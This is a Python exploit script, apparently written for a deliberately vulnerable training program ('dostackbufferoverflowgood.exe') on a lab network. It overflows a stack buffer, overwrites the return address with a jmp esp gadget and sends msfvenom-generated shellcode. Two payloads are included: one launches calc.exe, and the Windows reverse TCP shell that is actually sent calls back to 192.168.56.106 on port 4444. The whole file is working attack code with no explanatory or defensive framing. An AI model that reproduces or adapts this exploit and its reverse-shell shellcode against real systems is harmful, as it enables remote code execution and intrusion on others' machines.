import socket
import struct

RHOST = '192.168.56.150'
RPORT = 31337
RCV_SIZE = 1024 
OFFSET = 146 # Offset to saved return pointer
BUF_TOTLEN = 1024 # Fixed length buffer

def conv(address):
    return(struct.pack("<I", address))

def generate_badchar():
    badchar_test = b''
    badchars = [0x00, 0x0A]

    for i in range(0x00, 0xFF+1):
        if i not in badchars:
            badchar_test += struct.pack("B", i)

    with open("badchar_test.bin", "wb") as f:
        f.write(badchar_test)

    return(badchar_test) 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# !mona jmp -r esp -cpb "\x00\x0a"
#   0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\adminuser\Desktop\dotstack\dostackbufferoverflowgood.exe)
jmp_esp  = conv(0x080414c3)

# msfvenom -p windows/exec -b '\x00\x0a' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
shellcode_calc =  b""
shellcode_calc += b"\xd9\xf7\xd9\x74\x24\xf4\x5f\xbd\x77\x40"
shellcode_calc += b"\xe5\xaa\x29\xc9\xb1\x31\x31\x6f\x18\x03"
shellcode_calc += b"\x6f\x18\x83\xef\x8b\xa2\x10\x56\x9b\xa1"
shellcode_calc += b"\xdb\xa7\x5b\xc6\x52\x42\x6a\xc6\x01\x06"
shellcode_calc += b"\xdc\xf6\x42\x4a\xd0\x7d\x06\x7f\x63\xf3"
shellcode_calc += b"\x8f\x70\xc4\xbe\xe9\xbf\xd5\x93\xca\xde"
shellcode_calc += b"\x55\xee\x1e\x01\x64\x21\x53\x40\xa1\x5c"
shellcode_calc += b"\x9e\x10\x7a\x2a\x0d\x85\x0f\x66\x8e\x2e"
shellcode_calc += b"\x43\x66\x96\xd3\x13\x89\xb7\x45\x28\xd0"
shellcode_calc += b"\x17\x67\xfd\x68\x1e\x7f\xe2\x55\xe8\xf4"
shellcode_calc += b"\xd0\x22\xeb\xdc\x29\xca\x40\x21\x86\x39"
shellcode_calc += b"\x98\x65\x20\xa2\xef\x9f\x53\x5f\xe8\x5b"
shellcode_calc += b"\x2e\xbb\x7d\x78\x88\x48\x25\xa4\x29\x9c"
shellcode_calc += b"\xb0\x2f\x25\x69\xb6\x68\x29\x6c\x1b\x03"
shellcode_calc += b"\x55\xe5\x9a\xc4\xdc\xbd\xb8\xc0\x85\x66"
shellcode_calc += b"\xa0\x51\x63\xc8\xdd\x82\xcc\xb5\x7b\xc8"
shellcode_calc += b"\xe0\xa2\xf1\x93\x6e\x34\x87\xa9\xdc\x36"
shellcode_calc += b"\x97\xb1\x70\x5f\xa6\x3a\x1f\x18\x37\xe9"
shellcode_calc += b"\x64\xc6\xd5\x38\x90\x6f\x40\xa9\x19\xf2"
shellcode_calc += b"\x73\x07\x5d\x0b\xf0\xa2\x1d\xe8\xe8\xc6"
shellcode_calc += b"\x18\xb4\xae\x3b\x50\xa5\x5a\x3c\xc7\xc6"
shellcode_calc += b"\x4e\x5f\x86\x54\x12\x8e\x2d\xdd\xb1\xce"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.106 LPORT=4444 -b '\x00\x0a' -f python --var-name shell_rev_tcp_4444 EXITFUNC=thread
shell_rev_tcp_4444 =  b""
shell_rev_tcp_4444 += b"\xd9\xee\xd9\x74\x24\xf4\xbe\xa2\xdd"
shell_rev_tcp_4444 += b"\xfd\xe3\x58\x29\xc9\xb1\x52\x31\x70"
shell_rev_tcp_4444 += b"\x17\x83\xc0\x04\x03\xd2\xce\x1f\x16"
shell_rev_tcp_4444 += b"\xee\x19\x5d\xd9\x0e\xda\x02\x53\xeb"
shell_rev_tcp_4444 += b"\xeb\x02\x07\x78\x5b\xb3\x43\x2c\x50"
shell_rev_tcp_4444 += b"\x38\x01\xc4\xe3\x4c\x8e\xeb\x44\xfa"
shell_rev_tcp_4444 += b"\xe8\xc2\x55\x57\xc8\x45\xd6\xaa\x1d"
shell_rev_tcp_4444 += b"\xa5\xe7\x64\x50\xa4\x20\x98\x99\xf4"
shell_rev_tcp_4444 += b"\xf9\xd6\x0c\xe8\x8e\xa3\x8c\x83\xdd"
shell_rev_tcp_4444 += b"\x22\x95\x70\x95\x45\xb4\x27\xad\x1f"
shell_rev_tcp_4444 += b"\x16\xc6\x62\x14\x1f\xd0\x67\x11\xe9"
shell_rev_tcp_4444 += b"\x6b\x53\xed\xe8\xbd\xad\x0e\x46\x80"
shell_rev_tcp_4444 += b"\x01\xfd\x96\xc5\xa6\x1e\xed\x3f\xd5"
shell_rev_tcp_4444 += b"\xa3\xf6\x84\xa7\x7f\x72\x1e\x0f\x0b"
shell_rev_tcp_4444 += b"\x24\xfa\xb1\xd8\xb3\x89\xbe\x95\xb0"
shell_rev_tcp_4444 += b"\xd5\xa2\x28\x14\x6e\xde\xa1\x9b\xa0"
shell_rev_tcp_4444 += b"\x56\xf1\xbf\x64\x32\xa1\xde\x3d\x9e"
shell_rev_tcp_4444 += b"\x04\xde\x5d\x41\xf8\x7a\x16\x6c\xed"
shell_rev_tcp_4444 += b"\xf6\x75\xf9\xc2\x3a\x85\xf9\x4c\x4c"
shell_rev_tcp_4444 += b"\xf6\xcb\xd3\xe6\x90\x67\x9b\x20\x67"
shell_rev_tcp_4444 += b"\x87\xb6\x95\xf7\x76\x39\xe6\xde\xbc"
shell_rev_tcp_4444 += b"\x6d\xb6\x48\x14\x0e\x5d\x88\x99\xdb"
shell_rev_tcp_4444 += b"\xf2\xd8\x35\xb4\xb2\x88\xf5\x64\x5b"
shell_rev_tcp_4444 += b"\xc2\xf9\x5b\x7b\xed\xd3\xf3\x16\x14"
shell_rev_tcp_4444 += b"\xb4\x3b\x4e\x2e\x2e\xd4\x8d\x4e\xbf"
shell_rev_tcp_4444 += b"\x78\x1b\xa8\xd5\x90\x4d\x63\x42\x08"
shell_rev_tcp_4444 += b"\xd4\xff\xf3\xd5\xc2\x7a\x33\x5d\xe1"
shell_rev_tcp_4444 += b"\x7b\xfa\x96\x8c\x6f\x6b\x57\xdb\xcd"
shell_rev_tcp_4444 += b"\x3a\x68\xf1\x79\xa0\xfb\x9e\x79\xaf"
shell_rev_tcp_4444 += b"\xe7\x08\x2e\xf8\xd6\x40\xba\x14\x40"
shell_rev_tcp_4444 += b"\xfb\xd8\xe4\x14\xc4\x58\x33\xe5\xcb"
shell_rev_tcp_4444 += b"\x61\xb6\x51\xe8\x71\x0e\x59\xb4\x25"
shell_rev_tcp_4444 += b"\xde\x0c\x62\x93\x98\xe6\xc4\x4d\x73"
shell_rev_tcp_4444 += b"\x54\x8f\x19\x02\x96\x10\x5f\x0b\xf3"
shell_rev_tcp_4444 += b"\xe6\xbf\xba\xaa\xbe\xc0\x73\x3b\x37"
shell_rev_tcp_4444 += b"\xb9\x69\xdb\xb8\x10\x2a\xfb\x5a\xb0"
shell_rev_tcp_4444 += b"\x47\x94\xc2\x51\xea\xf9\xf4\x8c\x29"
shell_rev_tcp_4444 += b"\x04\x77\x24\xd2\xf3\x67\x4d\xd7\xb8"
shell_rev_tcp_4444 += b"\x2f\xbe\xa5\xd1\xc5\xc0\x1a\xd1\xcf"

buf  = b''
buf += b'A' * (OFFSET - len(buf)) # padding
buf += jmp_esp # Saved return pointer overwrite
buf += b'\x90' * 32 # NOP sled
buf += shell_rev_tcp_4444 # Shellcode
buf += b'\xCC' * (BUF_TOTLEN - len(buf)) # trailing padding
buf += b'\n' # \x0a

s.send(buf) # Sending initial buffer
print(f"Sent: {buf}") 